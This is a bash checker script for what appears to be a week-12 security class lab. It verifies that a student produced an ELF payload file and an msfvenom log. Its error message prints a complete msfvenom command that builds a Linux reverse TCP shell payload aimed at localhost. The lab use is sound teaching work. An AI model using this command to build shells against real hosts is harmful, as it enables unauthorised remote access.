#!/bin/bash
# Verify: payload file + generation log; stamped.

WORK="$HOME/kali-class-work/sec-wk12"
PAYLOAD="$WORK/payload.elf"
LOG="$WORK/msfvenom-log.txt"

if [ ! -s "$PAYLOAD" ]; then
    echo "$PAYLOAD is missing or empty." >&2
    echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o $PAYLOAD" >&2
    exit 1
fi

if ! file "$PAYLOAD" | grep -qiE "(ELF|executable)"; then
    echo "The payload file isn't a valid ELF binary — check the -f elf flag." >&2
    exit 1
fi

if [ ! -s "$LOG" ]; then
    echo "$LOG is missing or empty — save the msfvenom generation output." >&2
    exit 1
fi

STAMP=$(kali-class check-stamp sec-wk12 msfvenom 2>/dev/null)
if [ $? -ne 0 ]; then
    echo "$STAMP" >&2
    exit 1
fi

exit 0